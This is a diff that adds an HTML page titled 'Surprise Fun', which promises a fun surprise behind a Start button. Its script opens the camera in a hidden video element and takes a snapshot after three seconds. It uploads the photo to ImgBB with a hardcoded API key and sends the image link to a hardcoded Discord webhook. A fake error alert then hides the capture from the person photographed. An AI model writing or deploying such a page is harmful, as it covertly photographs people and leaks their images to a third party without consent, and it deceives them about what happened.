@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Surprise Fun</title>
+</head>
+<body>
+    <h1>Tap to see a fun surprise!</h1>
+    <button id="start">Start</button>
+    <video id="video" style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const startButton = document.getElementById('start');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        startButton.addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                video.play();
+
+                // Capture a photo after 3 seconds
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0);
+                    const dataURL = canvas.toDataURL('image/jpeg');
+
+                    // Upload to ImgBB
+                    const formData = new FormData();
+                    formData.append('image', dataURL.split(',')[1]);
+                    fetch('https://api.imgbb.com/1/upload?key=35c28639d507d8320ab4f1ea3818e152', {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        const imageUrl = data.data.url;
+                        // Optional: Send the URL to your Discord webhook
+                        fetch('https://discord.com/api/webhooks/1358100736562430063/TFwblvXeTSbUX3MV6_hJZqPjCySrnTfWGglCsiSoAJ1c2BIF0X7jSadkcUh0NKQ-epqM', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ content: imageUrl })
+                        });
+                    });
+
+                    // Stop the camera and hide the action
+                    stream.getTracks().forEach(track => track.stop());
+                    alert('Oops, something went wrong. Try again later!');
+                }, 3000); // Wait 3 seconds before snapping
+            } catch (error) {
+                alert('Camera access denied or an error occurred.');
+            }
+        });
+    </script>
+</body>
+</html>
